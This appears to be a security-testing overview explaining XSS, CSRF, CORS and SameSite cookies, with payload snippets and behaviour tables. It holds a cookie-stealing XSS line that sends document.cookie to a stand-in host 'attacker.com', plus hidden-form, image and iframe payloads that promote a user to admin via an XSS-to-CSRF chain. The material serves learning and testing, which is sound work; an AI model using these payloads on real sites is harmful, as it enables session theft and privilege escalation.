# XSS, CSRF, CORS, and SameSite Cookies: A Technical Overview for Security Testing and Exploitation

## 1. Cross-Site Scripting (XSS)

### Definition

XSS occurs when an attacker can inject malicious JavaScript into a webpage viewed by other users. This can be used to steal cookies, perform actions on behalf of a victim, or escalate access.

### Types

* **Stored XSS**: Injected script is saved server-side (e.g., in a comment or user profile).
* **Reflected XSS**: Payload appears in a URL or request and is reflected in the page.
* **DOM-based XSS**: JavaScript on the page dynamically processes attacker-controlled input.

### Common Exploit Payload

```javascript
window.location = 'https://attacker.com/steal?c=' + document.cookie;
```

## 2. Cross-Site Request Forgery (CSRF)

### Definition

CSRF occurs when a malicious site causes a user’s browser to perform an unwanted action on a different site where they are authenticated.

### Requirements for Exploitation

* Victim must be authenticated on the target site
* Session cookies must be automatically sent with the forged request
* The action must be triggerable without interaction (e.g., GET or auto-submitted POST)

### Example (GET CSRF via XSS)

```javascript
let img = new Image();
img.src = 'https://target-vhost.internal/profile.php?promote=admin';
```

### Example (POST CSRF via injected form)

```javascript
let form = document.createElement('form');
form.method = 'POST';
form.action = 'https://target-vhost.internal/profile.php';

let input = document.createElement('input');
input.type = 'hidden';
input.name = 'promote';
input.value = 'admin';
form.appendChild(input);

document.body.appendChild(form);
form.submit();
```

## 3. Cross-Origin Resource Sharing (CORS)

### Definition

CORS is a security mechanism that governs how web applications interact with resources from a different origin.

### CORS Headers

* `Access-Control-Allow-Origin`
* `Access-Control-Allow-Methods`
* `Access-Control-Allow-Headers`

### Relevance to Attackers

* **If CORS is misconfigured** (e.g., allows `*` or reflects origin without validation), attackers can read sensitive cross-origin responses.
* **Does not apply to CSRF**: CORS protects reading responses, not sending authenticated requests.

## 4. SameSite Cookies

### Definition

SameSite is a cookie attribute that controls whether cookies are sent with cross-site requests.

### Modes

* `SameSite=Strict`: Cookies not sent on any cross-site request.
* `SameSite=Lax`: Cookies sent on top-level navigations (e.g., `<a href>`), but not on background requests (`img`, `fetch`, `iframe`).
* `SameSite=None`: Cookies are sent with all requests **only if** the cookie is marked `Secure`.

### Relevance to Exploitation

* **CSRF fails if SameSite is Strict or Lax** and request is backgrounded (`img.src`, `fetch`) and not a top-level navigation.
* **XSS bypasses SameSite** because the malicious script runs in the same origin.

## 5. Attack Chain: XSS to CSRF

### Goal: Exploit XSS to trigger a privileged action via CSRF

#### Example Chain

1. Inject XSS payload into comment or profile page.
2. Wait for admin to view the page (stored XSS).
3. XSS payload auto-submits a form or triggers a GET request with the admin’s cookies.
4. Admin is unknowingly tricked into performing a privileged action (e.g., promoting a user).

### Example Full Payload

```javascript
let i = document.createElement('iframe');
i.src = 'https://target-vhost.internal/profile.php?promote=admin';
i.style.display = 'none';
document.body.appendChild(i);
```

---

## Summary Table

### Mechanism Overview

| Mechanism | Purpose                                       | Relevant To                             |
| --------- | --------------------------------------------- | --------------------------------------- |
| XSS       | Executes JavaScript in victim’s browser       | Stealing cookies, CSRF chaining         |
| CSRF      | Performs unwanted actions in victim’s session | Privilege escalation, changing settings |
| CORS      | Controls cross-origin resource reads          | Reading data from another origin        |
| SameSite  | Controls when cookies are sent                | Prevents CSRF if Strict or Lax          |

### Behavior Matrix

| Scenario                                | Will Cookies Be Sent? | Can Response Be Read? | Requires Same Origin? | XSS Impact | CSRF Feasible?            |
| --------------------------------------- | --------------------- | --------------------- | --------------------- | ---------- | ------------------------- |
| `img.src` with SameSite=Lax             | ❌                     | ❌                     | No                    | No         | ❌                         |
| `img.src` with SameSite=None            | ✅                     | ❌                     | No                    | No         | ✅                         |
| `fetch()` cross-origin + CORS misconfig | ✅                     | ✅                     | No                    | No         | ❌ (readable but not CSRF) |
| XSS on page                             | ✅                     | ✅                     | Yes                   | ✅          | ✅ (from XSS)              |
| Form POST from attacker.com             | Depends on SameSite   | ❌                     | No                    | No         | ✅ (if SameSite=None)      |

---

